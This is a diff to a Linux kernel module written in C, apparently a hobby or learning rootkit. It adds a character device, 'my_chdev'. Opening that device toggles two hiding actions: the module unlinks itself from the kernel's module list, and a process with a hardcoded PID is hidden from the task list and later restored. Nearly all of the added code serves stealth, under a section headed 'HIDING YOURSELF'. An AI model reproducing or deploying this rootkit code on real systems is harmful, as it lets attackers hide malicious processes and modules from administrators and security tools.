@@ -1,31 +1,58 @@
 #include <linux/module.h>
 #include <linux/printk.h>
+#include <linux/fs.h>
+#include <linux/cdev.h>
+
+#define HIDEPID 3949
 
 
-#define HIDEPID 3129
+#define MY_MAJOR        30
+#define DEVICE_NAME     "my_chdev"
+
+#define BUF_LEN         1024
 
 
 void hide_task(pid_t hide_pid);
 struct task_struct* find_task_bypid(pid_t hide_pid);
 void restore_task(struct task_struct* elected_task, pid_t hide_pid);
 
+int my_open(struct inode* incode, struct file* ptr_file);
+void hide_me(void);
+void shoh_me(void);
+
 
 struct task_struct* saved_task;
 char saved_task_name[16];
 struct pid saved_pid;
 
+struct file_operations my_fops = {
+    .open = my_open,
+};
+struct cdev my_dev;
+
 
 int init_module(void)
 {
     printk(KERN_INFO "Start work\n");
-    hide_task(HIDEPID);
+        
+    if (register_chrdev_region(MKDEV(MY_MAJOR, 0), 1, DEVICE_NAME) < 0)
+    {
+        printk(KERN_WARNING "Can't registrate device\n");
+        return 0;
+    }
+
+    cdev_init(&my_dev, &my_fops);
+    if (cdev_add(&my_dev, MKDEV(MY_MAJOR, 0), 1) < 0)
+        printk(KERN_WARNING "Can't add device\n");
+
     return 0;
 }
 
-
 void cleanup_module(void)
 {
-    restore_task(saved_task, HIDEPID);
+    cdev_del(&my_dev);
+    unregister_chrdev_region(MKDEV(MY_MAJOR, 0), 1);
+
     printk(KERN_INFO "Name of task %s", saved_task->comm);
     printk(KERN_INFO "Finish work\n");
 }
@@ -129,6 +156,40 @@ struct task_struct* find_task_bypid(pid_t hide_pid)
         }
     }
     return NULL;
+}
+
+
+//------------------------------- HIDING YOURSELF ---------------------
+
+static struct list_head *prev_module;
+
+void hide_me(void)
+{
+    prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+}
+
+void shoh_me(void)
+{
+    list_add(&THIS_MODULE->list, prev_module);
+}
+
+int my_open(struct inode* incode, struct file* ptr_file)
+{
+    static int hide = 0;
+    if ( !hide )
+    {
+        hide_me();
+        hide_task(HIDEPID);
+        hide = 1;
+    } else
+    {
+        shoh_me();
+        restore_task(saved_task, HIDEPID);
+        hide = 0;
+    }
+
+    return 0;
 }
 
 
